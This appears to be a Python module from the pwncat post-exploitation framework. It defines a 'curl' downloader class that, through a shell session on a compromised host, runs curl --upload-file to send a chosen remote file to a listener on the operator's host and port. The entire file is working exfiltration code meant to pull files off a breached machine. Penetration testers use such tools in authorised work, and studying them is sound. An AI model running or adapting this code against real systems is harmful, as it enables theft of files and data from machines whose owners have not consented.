#!/usr/bin/env python3
from typing import Generator
import shlex

from pwncat.downloader.base import HTTPDownloader, DownloadError


class CurlDownloader(HTTPDownloader):

    NAME = "curl"
    BINARIES = ["curl"]

    def command(self) -> Generator[str, None, None]:
        """ Generate the curl command to post the file """

        lhost = self.pty.vars["lhost"]
        lport = self.server.server_address[1]
        curl = self.pty.which("curl")
        remote_path = shlex.quote(self.remote_path)

        self.pty.run(f"{curl} --upload-file {remote_path} http://{lhost}:{lport}")
